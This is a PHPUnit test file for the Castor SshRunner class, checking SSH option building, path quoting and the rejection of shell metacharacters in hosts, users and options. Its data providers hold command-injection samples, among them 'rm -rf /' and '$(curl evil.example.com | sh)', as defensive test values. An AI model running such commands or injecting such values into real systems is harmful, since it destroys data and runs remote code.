<?php

namespace Castor\Tests;

use Castor\Context;
use Castor\ContextRegistry;
use Castor\Runner\ProcessRunner;
use Castor\Runner\SshRunner;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;
use Spatie\Ssh\Ssh;
use Symfony\Component\Process\Process;

class SshRunnerTest extends TestCase
{
    public function testPasswordAuthenticationIsDisabledWhenFalse(): void
    {
        $this->assertStringContainsString('-o PasswordAuthentication=no', $this->buildSshCommand([
            'password_authentication' => false,
        ]));
    }

    public function testStrictHostKeyCheckingIsDisabledWhenFalse(): void
    {
        $this->assertStringContainsString('-o StrictHostKeyChecking=no', $this->buildSshCommand([
            'enable_strict_check' => false,
        ]));
    }

    /**
     * Enabling either option means letting OpenSSH use its own default, so no
     * explicit "-o" is added to the command.
     */
    public function testNoOptionIsAddedWhenEnabled(): void
    {
        $command = $this->buildSshCommand([
            'password_authentication' => true,
            'enable_strict_check' => true,
        ]);

        $this->assertStringNotContainsString('PasswordAuthentication', $command);
        $this->assertStringNotContainsString('StrictHostKeyChecking', $command);
    }

    public function testNoOptionIsAddedWhenOmitted(): void
    {
        $command = $this->buildSshCommand([]);

        $this->assertStringNotContainsString('PasswordAuthentication', $command);
        $this->assertStringNotContainsString('StrictHostKeyChecking', $command);
    }

    #[DataProvider('provideValidTargets')]
    public function testValidHostsAndUsersAreAccepted(string $host, ?string $user): void
    {
        $this->assertStringContainsString((null === $user ? '' : $user . '@') . $host, $this->buildSshCommand([], $host, $user));
    }

    /**
     * @return iterable<string, array{string, ?string}>
     */
    public static function provideValidTargets(): iterable
    {
        yield 'host name' => ['server-1.example.com', 'debian'];
        yield 'IPv4' => ['10.0.0.1', 'root'];
        yield 'IPv6' => ['[2001:db8::1]', null];
        yield 'ssh config alias' => ['staging_web', null];
    }

    #[DataProvider('provideInvalidTargets')]
    public function testHostsUsersAndOptionsWithShellMetacharactersAreRejected(string $host, ?string $user, array $sshOptions): void
    {
        $this->expectException(\InvalidArgumentException::class);
        $this->expectExceptionMessage('shell metacharacter');

        $this->buildSshCommand($sshOptions, $host, $user);
    }

    /**
     * @return iterable<string, array{string, ?string, array<string, mixed>}>
     */
    public static function provideInvalidTargets(): iterable
    {
        yield 'command in the host' => ['example.com; rm -rf /', null, []];
        yield 'substitution in the host' => ['$(curl evil.example.com | sh)', null, []];
        yield 'space in the user' => ['example.com', 'debian -o ProxyCommand=evil', []];
        yield 'command in the jump host' => ['example.com', 'debian', ['jump_host' => 'bastion && evil']];
        yield 'command in the private key path' => ['example.com', 'debian', ['path_private_key' => '/tmp/key`evil`']];
        yield 'command in the control path' => ['example.com', 'debian', ['multiplexing_control_path' => '/tmp/%r@%h;evil']];
    }

    #[DataProvider('providePaths')]
    public function testTheRemotePathIsQuoted(string $path, string $expectedCd): void
    {
        $command = null;

        $processRunner = $this->createStub(ProcessRunner::class);
        $processRunner
            ->method('run')
            ->willReturnCallback(static function (string $c) use (&$command): Process {
                $command = $c;

                return new Process([]);
            })
        ;

        $contextRegistry = $this->createStub(ContextRegistry::class);
        $contextRegistry->method('getCurrentContext')->willReturn(new Context());

        new SshRunner($processRunner, $contextRegistry)->execute('ls', $path, 'server-1.example.com', 'debian');

        $this->assertStringContainsString($expectedCd . ' && ls', (string) $command);
    }

    /**
     * @return iterable<string, array{string, string}>
     */
    public static function providePaths(): iterable
    {
        yield 'absolute path' => ['/var/www/app', "cd '/var/www/app'"];
        yield 'path with a space' => ['/var/www/my app', "cd '/var/www/my app'"];
        yield 'path with a command' => ['/var/www; rm -rf /', "cd '/var/www; rm -rf /'"];
        yield 'home path' => ['~/app', "cd ~'/app'"];
        yield 'other user home path' => ['~deploy/app', "cd ~deploy'/app'"];
        yield 'bare home' => ['~', 'cd ~'];
    }

    /**
     * @param array{
     *     'port'?: int,
     *     'path_private_key'?: string,
     *     'jump_host'?: string,
     *     'multiplexing_control_path'?: string,
     *     'multiplexing_control_persist'?: string,
     *     'enable_strict_check'?: bool,
     *     'password_authentication'?: bool,
     * } $sshOptions
     */
    private function buildSshCommand(array $sshOptions, string $host = 'server-1.example.com', ?string $user = 'debian'): string
    {
        // buildSsh() does not use the constructor dependencies, so we can skip them.
        $runner = new \ReflectionClass(SshRunner::class)->newInstanceWithoutConstructor();
        $ssh = new \ReflectionMethod(SshRunner::class, 'buildSsh')->invoke($runner, $host, $user, $sshOptions);

        $this->assertInstanceOf(Ssh::class, $ssh);

        return $ssh->getExecuteCommand('ls');
    }
}
